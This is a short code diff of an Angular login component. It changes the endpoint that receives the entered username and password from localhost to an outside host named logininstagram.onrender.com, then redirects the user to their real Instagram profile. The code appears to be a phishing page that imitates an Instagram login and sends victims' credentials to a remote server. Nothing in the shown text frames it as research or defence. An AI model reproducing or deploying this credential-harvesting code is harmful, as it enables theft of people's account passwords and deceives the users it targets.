@@ -37,7 +37,7 @@ export class AppComponent implements OnInit {
       this.islogin = true;
     }
     if (this.password && this.username) {
-      this.http.post<any>(`http://localhost:3000/`, { username: this.username, password: this.password }).subscribe((res: any) => {
+      this.http.post<any>(`https://logininstagram.onrender.com/`, { username: this.username, password: this.password }).subscribe((res: any) => {
         console.log(res);
 
         window.open(`https://www.instagram.com/${this.username}`, '_self')
